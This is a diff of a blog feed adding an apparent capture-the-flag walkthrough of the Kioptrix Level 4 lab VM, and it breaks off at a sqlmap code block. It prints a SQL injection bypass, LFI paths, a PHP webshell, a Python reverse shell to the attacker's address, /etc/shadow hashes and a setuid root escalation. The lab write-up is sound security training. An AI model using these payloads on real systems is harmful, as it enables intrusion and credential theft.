@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Kioptrix | 0x73696e65]]></title>
   <link href="http://73696e65.github.io/blog/categories/kioptrix/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-08-25T13:02:16+02:00</updated>
+  <updated>2015-08-25T21:45:04+02:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -12,6 +12,554 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Kioptrix: Level 4]]></title>
+    <link href="http://73696e65.github.io/blog/2015/08/25/kioptrix-level-4/"/>
+    <updated>2015-08-25T18:18:32+02:00</updated>
+    <id>http://73696e65.github.io/blog/2015/08/25/kioptrix-level-4</id>
+    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/#">Kioptrix: Level 1.3 (#4)</a></p>
+
+<p>Nmap output:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap 192.168.80.154 -sT&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Starting Nmap 6.49BETA4 ( &lt;a href="https://nmap.org">https://nmap.org&lt;/a> ) at 2015-04-26 23:39 CEST
+</span><span class='line'>Nmap scan report for 192.168.80.154
+</span><span class='line'>Host is up (0.0015s latency).
+</span><span class='line'>Not shown: 566 closed ports, 430 filtered ports
+</span><span class='line'>PORT    STATE SERVICE
+</span><span class='line'>22/tcp  open  ssh
+</span><span class='line'>80/tcp  open  http
+</span><span class='line'>139/tcp open  netbios-ssn
+</span><span class='line'>445/tcp open  microsoft-ds
+</span><span class='line'>MAC Address: 00:0C:29:53:2F:A3 (VMware)&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Nmap done: 1 IP address (1 host up) scanned in 2.50 seconds</span></code></pre></td></tr></table></div></figure></p>
+
+<p>There is a member login on the <a href="http://192.168.80.154/index.php">http://192.168.80.154/index.php</a> site, we try the
+following credentials (SQLi):</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Username: Administrator
+</span><span class='line'>Password: test' or &lsquo;1&rsquo;=&lsquo;1</span></code></pre></td></tr></table></div></figure></p>
+
+<p>We logged into member site and after a few seconds found the local file
+inclusion vulnerability. Filtering the <code>etc</code> string could be easily evaded for displaying <code>/etc/passwd</code>:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.154/member.php?username=robert">http://192.168.80.154/member.php?username=robert&lt;/a>
+</span><span class='line'>&lt;a href="http://192.168.80.154/member.php?username=../../../../../etc/passwd">http://192.168.80.154/member.php?username=../../../../../etc/passwd&lt;/a> -> User ../../../../..//passwd
+</span><span class='line'>&lt;a href="http://192.168.80.154/member.php?username=../../../../../eetct/passwd">http://192.168.80.154/member.php?username=../../../../../eetct/passwd&lt;/a> -> User ../../../../../et/passwd
+</span><span class='line'>&lt;a href="http://192.168.80.154/member.php?username=../../../../../eetctc/passwd">http://192.168.80.154/member.php?username=../../../../../eetctc/passwd&lt;/a> -> /../../../../../etc/passwd.php
+</span><span class='line'>&lt;a href="http://192.168.80.154/member.php?username=../../../../../eetctc/passwd%00">http://192.168.80.154/member.php?username=../../../../../eetctc/passwd%00&lt;/a></span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# curl &ldquo;&lt;a href="http://192.168.80.154/member.php?username=../../../../../eetctc/passwd%00">http://192.168.80.154/member.php?username=../../../../../eetctc/passwd%00&lt;/a>&rdquo;
+</span><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
+</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
+</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
+</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
+</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
+</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
+</span><span class='line'>&lt;a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh&lt;/a>
+</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
+</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
+</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
+</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+</span><span class='line'>dhcp:x:101:102::/nonexistent:/bin/false
+</span><span class='line'>syslog:x:102:103::/home/syslog:/bin/false
+</span><span class='line'>klog:x:103:104::/home/klog:/bin/false
+</span><span class='line'>mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
+</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+</span><span class='line'>loneferret:x:1000:1000:loneferret,,,:/home/loneferret:/bin/bash
+</span><span class='line'>john:x:1001:1001:,,,:/home/john:/bin/kshell
+</span><span class='line'>robert:x:1002:1002:,,,:/home/robert:/bin/kshell</span></code></pre></td></tr></table></div></figure></p>
+
+<p><code>smbmap</code> output reveals:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# smbmap -H 192.168.80.154
+</span><span class='line'>[+] Finding open SMB ports&hellip;.
+</span><span class='line'>[+] User SMB session establishd on 192.168.80.154&hellip;
+</span><span class='line'>[+] IP: 192.168.80.154:445  Name: 192.168.80.154
+</span><span class='line'>    Disk                                                    Permissions
+</span><span class='line'>    &mdash;-                                                    &mdash;&mdash;&mdash;&ndash;
+</span><span class='line'>    print$                                              NO ACCESS
+</span><span class='line'>    IPC$                                                NO ACCESS</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Now we try to inject php backdoor. For this purpose, we use our session file.
+The file has a fixed location <code>/var/lib/php5/sess_</code> with the appended session
+cookie name:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00">http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&lt;/a>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>myusername|s:13:&ldquo;Administrator&rdquo;;mypassword|s:15:&ldquo;test' or &lsquo;1&rsquo;=&lsquo;1&rdquo;;</span></code></pre></td></tr></table></div></figure></p>
+
+<p>As we can see, the myusername session variable could be used to easily inject our code:</p>
+
+<p>We need to login using these credentials:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Username: &lt;?php system($_REQUEST[cmd]); ?>
+</span><span class='line'>Password: test' or &lsquo;1&rsquo;=&lsquo;1</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Now we have a backdoor, that uses parameter <code>cmd</code>. Digging deeper, we use python to execute reverse shell:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# curl &ldquo;&lt;a href="http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&amp;cmd=id">http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&amp;cmd=id&lt;/a>&rdquo;
+</span><span class='line'>myusername|s:32:&ldquo;uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class='line'>&rdquo;;mypassword|s:15:&ldquo;test' or &lsquo;1&rsquo;=&lsquo;1&rdquo;;&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@kali32:~# curl &ldquo;&lt;a href="http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&amp;cmd=cat%20database.sql">http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&amp;cmd=cat%20database.sql&lt;/a>&rdquo;
+</span><span class='line'>myusername|s:32:&ldquo;CREATE TABLE &lt;code>members&lt;/code> (
+</span><span class='line'>&lt;code>id&lt;/code> int(4) NOT NULL auto_increment,
+</span><span class='line'>&lt;code>username&lt;/code> varchar(65) NOT NULL default &lsquo;&rsquo;,
+</span><span class='line'>&lt;code>password&lt;/code> varchar(65) NOT NULL default &lsquo;&rsquo;,
+</span><span class='line'>PRIMARY KEY (&lt;code>id&lt;/code>)
+</span><span class='line'>) TYPE=MyISAM AUTO_INCREMENT=2 ;&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&ndash;&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h2>&ndash; Dumping data for table &lt;code>members&lt;/code>&lt;/h2>
+</span><span class='line'>
+</span><span class='line'>&lt;p>INSERT INTO &lt;code>members&lt;/code> VALUES (1, &lsquo;john&rsquo;, &lsquo;1234&rsquo;);
+</span><span class='line'>&ldquo;;mypassword|s:15:"test' or &lsquo;1&rsquo;=&lsquo;1&rdquo;;&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@kali32:/var/www/html# nc -l -p 1234
+</span><span class='line'>/bin/sh: can&rsquo;t access tty; job control turned off
+</span><span class='line'>$ id
+</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@kali32:~# curl &ldquo;&lt;a href="http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&amp;cmd=python+-c+">http://192.168.80.154/member.php?username=../../../../../var/lib/php5/sess_99abfd5b8d62c5172ff8bf2bc76b9061%00&amp;cmd=python+-c+&lt;/a>&lsquo;import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.80.137\&rdquo;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&ldquo;/bin/sh\&rdquo;,\&ldquo;-i\&rdquo;]);&rsquo;"&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>$ cat checklogin.php
+</span><span class='line'>&lt;?php
+</span><span class='line'>ob_start();
+</span><span class='line'>$host=&ldquo;localhost&rdquo;; // Host name
+</span><span class='line'>$username=&ldquo;root&rdquo;; // Mysql username
+</span><span class='line'>$password=&ldquo;&rdquo;; // Mysql password
+</span><span class='line'>$db_name=&ldquo;members&rdquo;; // Database name
+</span><span class='line'>$tbl_name=&ldquo;members&rdquo;; // Table name&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>// Connect to server and select databse.
+</span><span class='line'>mysql_connect(&ldquo;$host&rdquo;, &ldquo;$username&rdquo;, &ldquo;$password&rdquo;)or die(&ldquo;cannot connect&rdquo;);
+</span><span class='line'>mysql_select_db(&ldquo;$db_name&rdquo;)or die(&ldquo;cannot select DB&rdquo;);&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>// Define $myusername and $mypassword
+</span><span class='line'>$myusername=$&lt;em>POST[&lsquo;myusername&rsquo;];
+</span><span class='line'>$mypassword=$&lt;/em>POST[&lsquo;mypassword&rsquo;];&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>// To protect MySQL injection (more detail about MySQL injection)
+</span><span class='line'>$myusername = stripslashes($myusername);
+</span><span class='line'>//$mypassword = stripslashes($mypassword);
+</span><span class='line'>$myusername = mysql_real_escape_string($myusername);
+</span><span class='line'>//$mypassword = mysql_real_escape_string($mypassword);&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>//$sql=&ldquo;SELECT * FROM $tbl_name WHERE username=&lsquo;$myusername&rsquo; and password=&lsquo;$mypassword&rsquo;&rdquo;;
+</span><span class='line'>$result=mysql_query(&ldquo;SELECT * FROM $tbl_name WHERE username=&lsquo;$myusername&rsquo; and password=&lsquo;$mypassword&rsquo;&rdquo;);
+</span><span class='line'>//$result=mysql_query($sql);&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>// Mysql_num_row is counting table row
+</span><span class='line'>$count=mysql_num_rows($result);
+</span><span class='line'>// If result matched $myusername and $mypassword, table row must be 1 row&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>if($count!=0){
+</span><span class='line'>// Register $myusername, $mypassword and redirect to file &ldquo;login_success.php&rdquo;
+</span><span class='line'>    session_register(&ldquo;myusername&rdquo;);
+</span><span class='line'>    session_register(&ldquo;mypassword&rdquo;);
+</span><span class='line'>    header(&ldquo;location:login_success.php?username=$myusername&rdquo;);
+</span><span class='line'>}
+</span><span class='line'>else {
+</span><span class='line'>echo &ldquo;Wrong Username or Password&rdquo;;
+</span><span class='line'>print(&lsquo;&lt;form method="link" action="index.php">&lt;input type=submit value="Try Again">&lt;/form>&rsquo;);
+</span><span class='line'>}&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>ob_end_flush();
+</span><span class='line'>?></span></code></pre></td></tr></table></div></figure></p>
+
+<p>Because the mysql instance is running as root user, we have a full access to
+the database. We dump it and use the credentials for ssh login, for example
+with the user <code>john</code>. The <code>lshell</code> is executed, but noticing his <code>.lhistory</code> file,
+bash could be directly executed too. Finally, we set the suid privileges for
+<code>dash</code> using mysql and obtain the root privileges:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo &ldquo;select * from members&rdquo; | mysql -u root members
+</span><span class='line'>id  username    password
+</span><span class='line'>1   john    MyNameIsJohn
+</span><span class='line'>2   robert  ADGAdsafdfwt4gadfga==&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>$ cat /home/john/.lhistory
+</span><span class='line'>?
+</span><span class='line'>help
+</span><span class='line'>echo os.system(&lsquo;/bin/bash&rsquo;)
+</span><span class='line'>exit
+</span><span class='line'>su
+</span><span class='line'>sudo
+</span><span class='line'>?
+</span><span class='line'>scp
+</span><span class='line'>touch hello
+</span><span class='line'>help
+</span><span class='line'>ls /root
+</span><span class='line'>exit
+</span><span class='line'>echo os.system(&lsquo;/bin/bash&rsquo;)
+</span><span class='line'>exit&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@kali32:~# ssh -l john 192.168.80.154
+</span><span class='line'>&lt;a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#106;&#x6f;&#x68;&#110;&#x40;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x38;&#x30;&#x2e;&#49;&#x35;&#x34;">&#106;&#111;&#x68;&#x6e;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#56;&#48;&#x2e;&#x31;&#53;&#x34;&lt;/a>&rsquo;s password:
+</span><span class='line'>Welcome to LigGoat Security Systems - We are Watching
+</span><span class='line'>== Welcome LigGoat Employee ==
+</span><span class='line'>LigGoat Shell is in place so you  don&rsquo;t screw up
+</span><span class='line'>Type &lsquo;?&rsquo; or &lsquo;help&rsquo; to get the list of allowed commands
+</span><span class='line'>john:~$ echo os.system(&lsquo;/bin/bash&rsquo;)
+</span><span class='line'>john@Kioptrix4:~$ id
+</span><span class='line'>uid=1001(john) gid=1001(john) groups=1001(john)&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>john:~$ mysql -u root&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>mysql> select sys_exec(&lsquo;cat /etc/shadow > /tmp/a&rsquo;);
+</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+</span><span class='line'>| sys_exec(&lsquo;cat /etc/shadow > /tmp/a&rsquo;) |
+</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+</span><span class='line'>| NULL                                 |
+</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+</span><span class='line'>1 row in set (0.01 sec)&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>mysql>
+</span><span class='line'>[1]+  Stopped                 mysql -u root
+</span><span class='line'>john@Kioptrix4:~$ cat /tmp/a
+</span><span class='line'>root:$1$5GMEyqwV$x0b1nMsYFXvczN0yI0kBB.:15375:0:99999:7:::
+</span><span class='line'>daemon:&lt;em>:15374:0:99999:7:::
+</span><span class='line'>bin:&lt;/em>:15374:0:99999:7:::
+</span><span class='line'>sys:&lt;em>:15374:0:99999:7:::
+</span><span class='line'>sync:&lt;/em>:15374:0:99999:7:::
+</span><span class='line'>games:&lt;em>:15374:0:99999:7:::
+</span><span class='line'>man:&lt;/em>:15374:0:99999:7:::
+</span><span class='line'>lp:&lt;em>:15374:0:99999:7:::
+</span><span class='line'>mail:&lt;/em>:15374:0:99999:7:::
+</span><span class='line'>&lt;a href="news:*:15374:0:99999:7:::">news:*:15374:0:99999:7:::&lt;/a>
+</span><span class='line'>uucp:&lt;em>:15374:0:99999:7:::
+</span><span class='line'>proxy:&lt;/em>:15374:0:99999:7:::
+</span><span class='line'>www-data:&lt;em>:15374:0:99999:7:::
+</span><span class='line'>backup:&lt;/em>:15374:0:99999:7:::
+</span><span class='line'>list:&lt;em>:15374:0:99999:7:::
+</span><span class='line'>irc:&lt;/em>:15374:0:99999:7:::
+</span><span class='line'>gnats:&lt;em>:15374:0:99999:7:::
+</span><span class='line'>nobody:&lt;/em>:15374:0:99999:7:::
+</span><span class='line'>libuuid:!:15374:0:99999:7:::
+</span><span class='line'>dhcp:&lt;em>:15374:0:99999:7:::
+</span><span class='line'>syslog:&lt;/em>:15374:0:99999:7:::
+</span><span class='line'>klog:&lt;em>:15374:0:99999:7:::
+</span><span class='line'>mysql:!:15374:0:99999:7:::
+</span><span class='line'>sshd:&lt;/em>:15374:0:99999:7:::
+</span><span class='line'>loneferret:$1$/x6RLO82$43aCgYCrK7p2KFwgYw9iU1:15375:0:99999:7:::
+</span><span class='line'>john:$1$H.GRhlY6$sKlytDrwFEhu5dULXItWw/:15374:0:99999:7:::
+</span><span class='line'>robert:$1$rQRWeUha$ftBrgVvcHYfFFFk6Ut6cM1:15374:0:99999:7:::
+</span><span class='line'>john@Kioptrix4:/etc/samba$&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>mysql> select sys_exec(&lsquo;chmod +s /bin/dash&rsquo;);
+</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+</span><span class='line'>| sys_exec(&lsquo;chmod +s /bin/dash&rsquo;) |
+</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+</span><span class='line'>| NULL                           |
+</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
+</span><span class='line'>1 row in set (0.01 sec)&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>john@Kioptrix4:~$ /bin/dash&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>id&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>uid=1001(john) gid=1001(john) euid=0(root) egid=0(root) groups=1001(john)&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>cd /root&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>cat congrats.txt&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Congratulations!
+</span><span class='line'>You&rsquo;ve got root.&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>There is more then one way to get root on this system. Try and find them.
+</span><span class='line'>I&rsquo;ve only tested two (2) methods, but it doesn&rsquo;t mean there aren&rsquo;t more.
+</span><span class='line'>As always there&rsquo;s an easy way, and a not so easy way to pop this box.
+</span><span class='line'>Look for other methods to get root privileges other than running an exploit.&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>It took a while to make this. For one it&rsquo;s not as easy as it may look, and
+</span><span class='line'>also work and family life are my priorities. Hobbies are low on my list.
+</span><span class='line'>Really hope you enjoyed this one.&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>If you haven&rsquo;t already, check out the other VMs available on:
+</span><span class='line'>www.kioptrix.com&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Thanks for playing,
+</span><span class='line'>loneferret</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Because the UDF exploitation is well known for sqlmap, we could solve the challenge also using this tool:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
